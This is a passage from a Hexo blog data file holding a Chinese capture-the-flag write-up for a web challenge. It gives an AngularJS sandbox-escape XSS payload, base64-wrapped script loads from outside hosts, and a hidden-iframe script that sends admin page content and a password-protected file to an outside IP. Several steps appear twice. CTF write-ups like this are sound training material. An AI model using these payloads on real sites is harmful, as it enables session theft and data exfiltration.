<p>新版后台2.0!</p><br>     </div><br>   </div>\n\n\n<pre><code>   &lt;!-- Bootstrap core JavaScript\n</code></pre><p>   ================================================== –&gt;<br>   <!-- Placed at the end of the document so the pages load faster --><br>   <script src=\"https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js\"></script><br>   <script src=\"https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js\"></script><br>   <!-- IE10 viewport hack for Surface/desktop Windows 8 bug --><br>   <script src=\"js/ie10-viewport-bug-workaround.js\"></script></p>\n<p>   <br>   </p>\n<pre><code>\n9. 获取`admin/file`，需要登录\n</code></pre><p>   <div class=\"container\"><br>     <form method=\"post\"><br>       <label for=\"filePasswd\" class=\"sr-only\">输入文件密码</label><br>       <input type=\"text\" id=\"filePasswd\" class=\"form-control\" placeholder=\"filepasswd\" required autofocus name=\"filepasswd\"><br>       <button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">提交</button><br>     </form><br>   </div></p>\n<pre><code>\n10. 我们发现新的用户\n</code></pre><p>  adminClound</p>\n<pre><code>\n  结合路由:\n</code></pre><p>  <a href=\"http://116.62.137.114:4879/api/memos/admintest2313\" target=\"_blank\" rel=\"noopener\">http://116.62.137.114:4879/api/memos/admintest2313</a></p>\n<pre><code>\n  访问`http://116.62.137.114:4879/api/memos/adminClound`\n\n  得到`adminClound`的密码:`HGf^&amp;39NsslUIf^23`\n\n11. 登录`admin/file`\n\n    paylaod如下：\n</code></pre><pre><code>$.ajax({\n    url: &quot;/admin/file&quot;,\n    type: &quot;POST&quot;,\n    data: &quot;filepasswd=HGf%5E%2639NsslUIf%5E23&quot;,\n    dataType: &quot;text&quot;,\n    success: function(result) {\n        var code = btoa(encodeURIComponent(result));\n        xssPost(&#39;http://123.207.90.143&#39;, code);\n    },\n    error: function(msg) {\n\n    }\n})\n\nfunction xssPost(url, postStr) {\n    var de;\n    de = document.body.appendChild(document.createElement(&#39;iframe&#39;));\n    de.src = &#39;about:blank&#39;;\n    de.height = 1;\n    de.width = 1;\n    de.contentDocument.write(&#39;&lt;form method=&quot;GET&quot; action=&quot;&#39; + url + &#39;&quot;&gt;&lt;input name=&quot;code&quot; value=&quot;&#39; + postStr + &#39;&quot;/&gt;&lt;/form&gt;&#39;);\n    de.contentDocument.forms[0].submit();\n    de.style.display = &#39;none&#39;;\n}\n\n```\n\n得到flag:`sctf{T4is_is_f1ag2313}`。\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"新的建议板\"><a href=\"#新的建议板\" class=\"headerlink\" title=\"新的建议板\"></a>新的建议板</h1><ol>\n<li><p>基础payload</p>\n<pre><code class=\"js\">{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(alert(1))//');}}\n</code></pre>\n</li>\n<li><p>打cookie</p>\n<pre><code class=\"js\">{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==\\'))//');}}\n</code></pre>\n</li>\n<li><p>调用script</p>\n<p>使用</p>\n<blockquote>\n<p>$.getScript(‘<a href=\"https://xsspt.com/HMTzMS\" target=\"_blank\" rel=\"noopener\">https://xsspt.com/HMTzMS</a>‘)</p>\n<p>base64一下: <code>JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==</code></p>\n</blockquote>\n</li>\n<li><p>这样就可以拿到cookie</p>\n<p>接收到的内容如下:</p>\n<pre><code>location : http://127.0.0.1:1002/admin/suggest?suggest=%7B%7B&#39;a&#39;.constructor.prototype.charAt=[].join;$eval(&#39;x=1%7D%20%7D%20%7D;eval(atob(%5C&#39;JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==%5C&#39;))//&#39;);%7D%7D\n</code></pre></li>\n<li><p>cookie里边并没有flag，并且给的地址为本地地址，并不在公网上。</p>\n</li>\n<li><p>获取<code>/admin</code>的内容</p>\n<pre><code>JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\n=&gt;\n$.getScript(&#39;http://123.207.90.143/su.js&#39;)\n</code></pre><pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\\'))//');}}\n</code></pre></li>\n<li><p>su.js内容即paylaod如下：</p>\n<pre><code>$.ajax({\n    url: &quot;/admin&quot;,\n    type: &quot;GET&quot;,\n    dataType: &quot;text&quot;,\n    success: function(result) {\n        var code = btoa(encodeURIComponent(result));\n        xssPost(&#39;http://123.207.90.143&#39;, code);\n    },\n    error: function(msg) {\n\n    }\n})\n\nfunction xssPost(url, postStr) {\n    var de;\n    de = document.body.appendChild(document.createElement(&#39;iframe&#39;));\n    de.src = &#39;about:blank&#39;;\n    de.height = 1;\n    de.width = 1;\n    de.contentDocument.write(&#39;&lt;form method=&quot;GET&quot; action=&quot;&#39; + url + &#39;&quot;&gt;&lt;input name=&quot;code&quot; value=&quot;&#39; + postStr + &#39;&quot;/&gt;&lt;/form&gt;&#39;);\n    de.contentDocument.forms[0].submit();\n    de.style.display = &#39;none&#39;;\n}\n</code></pre></li>\n<li><p>admin内容如下:</p>\n<pre><code>JTBEJTBBJTNDIURPQ1RZUEUlMjBodG1sJTNFJTBEJTBBJTNDaHRtbCUyMGxhbmclM0QlMjJ6aC1DTiUyMiUzRSUwRCUwQSUyMCUyMCUzQ2hlYWQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwY2hhcnNldCUzRCUyMnV0Zi04JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJYLVVBLUNvbXBhdGlibGUlMjIlMjBjb250ZW50JTNEJTIySUUlM0RlZGdlJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMG5hbWUlM0QlMjJ2aWV3cG9ydCUyMiUyMGNvbnRlbnQlM0QlMjJ3aWR0aCUzRGRldmljZS13aWR0aCUyQyUyMGluaXRpYWwtc2NhbGUlM0QxJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDIS0tJTIwJUU0JUI4JThBJUU4JUJGJUIwMyVFNCVCOCVBQW1ldGElRTYlQTAlODclRTclQUQlQkUqJUU1JUJGJTg1JUU5JUExJUJCKiVFNiU5NCVCRSVFNSU5QyVBOCVFNiU5QyU4MCVFNSU4OSU4RCVFOSU5RCVBMiVFRiVCQyU4QyVFNCVCQiVCQiVFNCVCRCU5NSVFNSU4NSVCNiVFNCVCQiU5NiVFNSU4NiU4NSVFNSVBRSVCOSVFOSU4MyVCRColRTUlQkYlODUlRTklQTElQkIqJUU4JUI3JTlGJUU5JTlBJThGJUU1JTg1JUI2JUU1JTkwJThFJUVGJUJDJTgxJTIwLS0lM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwbmFtZSUzRCUyMmRlc2NyaXB0aW9uJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ21ldGElMjBuYW1lJTNEJTIyYXV0aG9yJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjByZWwlM0QlMjJpY29uJTIyJTIwaHJlZiUzRCUyMiUyMiUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3RpdGxlJTNFU1lDJTNDJTJGdGl0bGUlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZjc3MlMkZib290c3RyYXAubWluLmNzcyUyMiUyMHJlbCUzRCUyMnN0eWxlc2hlZXQlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmNzcyUyRmllMTAtdmlld3BvcnQtYnVnLXdvcmthcm91bmQuY3NzJTIyJTIwcmVsJTNEJTIyc3R5bGVzaGVldCUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjBocmVmJTNEJTIyY3NzJTJGc3RhcnRlci10ZW1wbGF0ZS5jc3MlMjIlMjByZWwlM0QlMjJzdHlsZXNoZWV0JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc3R5bGUlMjB0eXBlJTNEJTIydGV4dCUyRmNzcyUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvZHklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLXRvcCUzQSUyMDYwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLWJvdHRvbSUzQSUyMDQwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZzdHlsZSUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYW5ndWxhci5qcyUyRjEuNC42JTJGYW5ndWxhci5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NzY3JpcHQlMjBzcmMlM0QlMjJodHRwcyUzQSUyRiUyRmFwcHMuYmRpbWcuY29tJTJGbGlicyUyRmFuZ3VsYXItcm91dGUlMkYxLjMuMTMlMkZhbmd1bGFyLXJvdXRlLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZS1lbXVsYXRpb24tbW9kZXMtd2FybmluZy5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUwRCUwQSUyMCUyMCUzQyUyRmhlYWQlM0UlMEQlMEElMEQlMEElMjAlMjAlM0Nib2R5JTIwJTNFJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTNDbmF2JTIwY2xhc3MlM0QlMjJuYXZiYXIlMjBuYXZiYXItaW52ZXJzZSUyMG5hdmJhci1maXhlZC10b3AlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIybmF2YmFyLWhlYWRlciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2J1dHRvbiUyMHR5cGUlM0QlMjJidXR0b24lMjIlMjBjbGFzcyUzRCUyMm5hdmJhci10b2dnbGUlMjBjb2xsYXBzZWQlMjIlMjBkYXRhLXRvZ2dsZSUzRCUyMmNvbGxhcHNlJTIyJTIwZGF0YS10YXJnZXQlM0QlMjIlMjNuYXZiYXIlMjIlMjBhcmlhLWV4cGFuZGVkJTNEJTIyZmFsc2UlMjIlMjBhcmlhLWNvbnRyb2xzJTNEJTIybmF2YmFyJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyc3Itb25seSUyMiUzRVRvZ2dsZSUyMG5hdmlnYXRpb24lM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGYnV0dG9uJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDYSUyMGNsYXNzJTNEJTIybmF2YmFyLWJyYW5kJTIyJTIwaHJlZiUzRCUyMiUyRiUyMiUzRVNZQyUyMEFETUlOJTNDJTJGYSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRmRpdiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGlkJTNEJTIybmF2YmFyJTIyJTIwY2xhc3MlM0QlMjJjb2xsYXBzZSUyMG5hdmJhci1jb2xsYXBzZSUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ3VsJTIwY2xhc3MlM0QlMjJuYXYlMjBuYXZiYXItbmF2JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklMjBjbGFzcyUzRCUyMmFjdGl2ZSUyMiUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFSG9tZSUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjIlMjMlMjIlM0UlRTYlOTclQTUlRTUlQkYlOTclM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU4JUI0JUE2JUU1JThEJTk1JTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NhJTIwaHJlZiUzRCUyMmFkbWluJTJGZmlsZSUyMiUzRSVFNiU5NiU4NyVFNCVCQiVCNiUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjJhZG1pbiUyRnN1Z2dlc3QlMjIlM0UlRTclOTUlOTklRTglQTglODAlM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU1JThGJTkxJUU1JUI4JTgzJTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGdWwlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0MlMkZuYXYlM0UlMEQlMEElMEQlMEElMEQlMEElM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIyanVtYm90cm9uJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDaDElM0VIRUxMTyUyMGFkbWluQ2xvdW5kJTNDJTJGaDElM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NwJTNFJUU2JTk2JUIwJUU3JTg5JTg4JUU1JTkwJThFJUU1JThGJUIwMi4wISUzQyUyRnAlM0UlMEQlMEElMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElM0MlMkZkaXYlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0MhLS0lMjBCb290c3RyYXAlMjBjb3JlJTIwSmF2YVNjcmlwdCUwRCUwQSUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUyMC0tJTNFJTBEJTBBJTNDIS0tJTIwUGxhY2VkJTIwYXQlMjB0aGUlMjBlbmQlMjBvZiUyMHRoZSUyMGRvY3VtZW50JTIwc28lMjB0aGUlMjBwYWdlcyUyMGxvYWQlMjBmYXN0ZXIlMjAtLSUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGanF1ZXJ5JTJGMS4xMi40JTJGanF1ZXJ5Lm1pbi5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZqcyUyRmJvb3RzdHJhcC5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElM0MhLS0lMjBJRTEwJTIwdmlld3BvcnQlMjBoYWNrJTIwZm9yJTIwU3VyZmFjZSUyRmRlc2t0b3AlMjBXaW5kb3dzJTIwOCUyMGJ1ZyUyMC0tJTNFJTBEJTBBJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZTEwLXZpZXdwb3J0LWJ1Zy13b3JrYXJvdW5kLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTBEJTBBJTNDJTJGYm9keSUzRSUwRCUwQSUzQyUyRmh0bWwlM0UlMEQlMEElMEQlMEE%3D\n</code></pre><p>解码后:</p>\n<p>```<br>&lt;!DOCTYPE html&gt;<br><html lang=\"zh-CN\"><br>  <head></head></html></p>\n<pre><code>&lt;meta charset=&quot;utf-8&quot;&gt;\n&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;\n&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;\n&lt;!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ --&gt;\n&lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;\n&lt;meta name=&quot;author&quot; content=&quot;&quot;&gt;\n&lt;link rel=&quot;icon&quot; href=&quot;&quot;&gt;\n\n&lt;title&gt;SYC&lt;/title&gt;\n</code></pre></li>\n</ol>\n<pre><code>   &lt;link href=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;\n   &lt;link href=&quot;css/ie10-viewport-bug-workaround.css&quot; rel=&quot;stylesheet&quot;&gt;\n   &lt;link href=&quot;css/starter-template.css&quot; rel=&quot;stylesheet&quot;&gt;\n   &lt;style type=&quot;text/css&quot;&gt;\n         body {\n           padding-top: 60px;\n           padding-bottom: 40px;\n         }\n       &lt;/style&gt;\n\n   &lt;script src=&quot;https://cdn.bootcss.com/angular.js/1.4.6/angular.min.js&quot;&gt;&lt;/script&gt;\n   &lt;script src=&quot;https://apps.bdimg.com/libs/angular-route/1.3.13/angular-route.js&quot;&gt;&lt;/script&gt;\n   &lt;script src=&quot;js/ie-emulation-modes-warning.js&quot;&gt;&lt;/script&gt;\n\n &lt;/head&gt;\n\n &lt;body &gt;\n\n   &lt;nav class=&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt;\n     &lt;div class=&quot;container&quot;&gt;\n       &lt;div class=&quot;navbar-header&quot;&gt;\n         &lt;button type=&quot;button&quot; class=&quot;navbar-toggle collapsed&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbar&quot; aria-expanded=&quot;false&quot; aria-controls=&quot;navbar&quot;&gt;\n           &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt;\n           &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;\n           &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;\n           &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;\n         &lt;/button&gt;\n         &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;SYC ADMIN&lt;/a&gt;\n       &lt;/div&gt;\n       &lt;div id=&quot;navbar&quot; class=&quot;collapse navbar-collapse&quot;&gt;\n         &lt;ul class=&quot;nav navbar-nav&quot;&gt;\n           &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;#&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;\n           &lt;li&gt;&lt;a href=&quot;#&quot;&gt;日志&lt;/a&gt;&lt;/li&gt;\n           &lt;li&gt;&lt;a href=&quot;#&quot;&gt;账单&lt;/a&gt;&lt;/li&gt;\n           &lt;li&gt;&lt;a href=&quot;admin/file&quot;&gt;文件&lt;/a&gt;&lt;/li&gt;\n           &lt;li&gt;&lt;a href=&quot;admin/suggest&quot;&gt;留言&lt;/a&gt;&lt;/li&gt;\n           &lt;li&gt;&lt;a href=&quot;#&quot;&gt;发布&lt;/a&gt;&lt;/li&gt;\n         &lt;/ul&gt;\n       &lt;/div&gt;\n     &lt;/div&gt;\n   &lt;/nav&gt;\n</code></pre>   <div class=\"container\"><br>     <div class=\"jumbotron\"><br>           <h1>HELLO adminClound</h1><br>           <p>新版后台2.0!</p><br>     </div><br>   </div>\n\n\n<pre><code>   &lt;!-- Bootstrap core JavaScript\n</code></pre><p>   ================================================== –&gt;<br>   <!-- Placed at the end of the document so the pages load faster --><br>   <script src=\"https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js\"></script><br>   <script src=\"https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js\"></script><br>   <!-- IE10 viewport hack for Surface/desktop Windows 8 bug --><br>   <script src=\"js/ie10-viewport-bug-workaround.js\"></script></p>\n<p>   <br>   </p>\n<pre><code>\n9. 获取`admin/file`，需要登录\n</code></pre><p>   <div class=\"container\"><br>     <form method=\"post\"><br>       <label for=\"filePasswd\" class=\"sr-only\">输入文件密码</label><br>       <input type=\"text\" id=\"filePasswd\" class=\"form-control\" placeholder=\"filepasswd\" required autofocus name=\"filepasswd\"><br>       <button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">提交</button><br>     </form><br>   </div></p>\n<pre><code>\n10. 我们发现新的用户\n</code></pre><p>  adminClound</p>\n<pre><code>\n  结合路由:\n</code></pre><p>  <a href=\"http://116.62.137.114:4879/api/memos/admintest2313\" target=\"_blank\" rel=\"noopener\">http://116.62.137.114:4879/api/memos/admintest2313</a></p>\n<pre><code>\n  访问`http://116.62.137.114:4879/api/memos/adminClound`\n\n  得到`adminClound`的密码:`HGf^&amp;39NsslUIf^23`\n\n11. 登录`admin/file`\n\n    paylaod如下：\n</code></pre><pre><code>$.ajax({\n    url: &quot;/admin/file&quot;,\n    type: &quot;POST&quot;,\n    data: &quot;filepasswd=HGf%5E%2639NsslUIf%5E23&quot;,\n    dataType: &quot;text&quot;,\n    success: function(result) {\n        var code = btoa(encodeURIComponent(result));\n        xssPost(&#39;http://123.207.90.143&#39;, code);\n    },\n    error: function(msg) {\n\n    }\n})\n\nfunction xssPost(url, postStr) {\n    var de;\n    de = document.body.appendChild(document.createElement(&#39;iframe&#39;));\n    de.src = &#39;about:blank&#39;;\n    de.height = 1;\n    de.width = 1;\n    de.contentDocument.write(&#39;&lt;form method=&quot;GET&quot; action=&quot;&#39; + url + &#39;&quot;&gt;&lt;input name=&quot;code&quot; value=&quot;&#39; + postStr + &#39;&quot;/&gt;&lt;/form&gt;&#39;);\n    de.contentDocument.forms[0].submit();\n    de.style.display = &#39;none&#39;;\n}\n\n```\n\n得到flag:`sctf{T4is_is_f1ag2313}`。\n</code></pre>"}],"PostAsset":[],"PostCategory":[{"post_id":"cjity3jpv0010ly4jk6hx7zsw","category_id":"cjity3jq00014ly4j77i5uhbh","_id":"cjity3jqc001jly4jr3h05ls0"},{"post_id":"cjity3jpv0010ly4jk6hx7zsw","category_id":"cjity3jq8001dly4jvbo3edkj","_id":"cjity3jqc001lly4jzv19mnqz"}],"PostTag":[{"post_id":"cjity3jod0000ly4jyg5lobd1","tag_id":"cjity3joq0003ly4jjjqen570","_id":"cjity3jp00008ly4jqj27385t"},{"post_id":"cjity3jom0002ly4j6bh2p92p","tag_id":"cjity3jox0007ly4jdv738b9o","_id":"cjity3jpc000dly4jejlptqi6"},{"post_id":"cjity3jos0004ly4j0rxeaa40","tag_id":"cjity3joq0003ly4jjjqen570","_id":"cjity3jpg000hly4jn94kvx5v"},{"post_id":"cjity3jou0005ly4j39200hbc","tag_id":"cjity3jpe000fly4jq0htiy2d","_id":"cjity3jpk000lly4joifzsjgm"},{"post_id":"cjity3jow0006ly4jhrjwrwa3","tag_id":"cjity3jpj000jly4jajpi95t8","_id":"cjity3jpo000ply4jjqe2grsq"},{"post_id":"cjity3jpk000mly4jidhqfwc4","tag_id":"cjity3joq0003ly4jjjqen570","_id":"cjity3jpp000rly4jfiy9ten6"},{"post_id":"cjity3jp00009ly4jexszs02d","tag_id":"cjity3jpe000fly4jq0htiy2d","_id":"cjity3jpq000uly4jmzt3g6yh"},{"post_id":"cjity3jpa000cly4j41lg0lyj","tag_id":"cjity3jpp000sly4jislntwaf","_id":"cjity3jpu000yly4jwsgjeymw"},{"post_id":"cjity3jpu000zly4jjjofyue5","tag_id":"cjity3jox0007ly4jdv738b9o","_id":"cjity3jpy0012ly4jhvykwpa1"},{"post_id":"cjity3jpd000ely4jtf0cssj3","tag_id":"cjity3jpe000fly4jq0htiy2d","_id":"cjity3jq10015ly4jtf9l82cs"},{"post_id":"cjity3jpm000oly4jlkp4k7in","tag_id":"cjity3jpw0011ly4jc3vu73pg","_id":"cjity3jq40019ly4j0pg21p6d"},{"post_id":"cjity3jpv0010ly4jk6hx7zsw","tag_id":"cjity3jq20017ly4j4vwjkrss","_id":"cjity3jqb001hly4jdoweictv"},{"post_id":"cjity3jpv0010ly4jk6hx7zsw","tag_id":"cjity3jq6001bly4jhzrhfgug","_id":"cjity3jqc001ily4j4tbxqm67"},{"post_id":"cjity3jq10016ly4j60uzne1e","tag_id":"cjity3jq9001fly4jhy3jt7nz","_id":"cjity3jqc001kly4j8p7bkclv"}],"Tag":[{"name":"pwn","_id":"cjity3joq0003ly4jjjqen570"},{"name":"web安全","_id":"cjity3jox0007ly4jdv738b9o"},{"name":"ctf","_id":"cjity3jpe000fly4jq0htiy2d"},{"name":"工具手册","_id":"cjity3jpj000jly4jajpi95t8"},{"name":"mysql","_id":"cjity3jpp000sly4jislntwaf"},{"name":"python","_id":"cjity3jpw0011ly4jc3vu73pg"},{"name":"安全","_id":"cjity3jq20017ly4j4vwjkrss"},{"name":"sql注入","_id":"cjity3jq6001bly4jhzrhfgug"},{"name":"前端","_id":"cjity3jq9001fly4jhy3jt7nz"}]}}